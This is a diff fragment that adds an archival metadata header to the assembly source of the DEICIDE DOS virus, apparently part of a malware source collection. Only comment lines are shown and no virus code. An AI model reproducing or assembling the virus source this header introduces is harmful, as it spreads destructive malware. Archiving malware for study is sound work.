@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      D
+; type      asm
+; cve       —
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     —
+; ------------------------------------------------------------
 ;***************************************************************************
 ; Source code of the DEICIDE Virus, original author: Glen Benton
 ; Assemble with A86 - Sanitized, English-ized and spruced up for inclusion
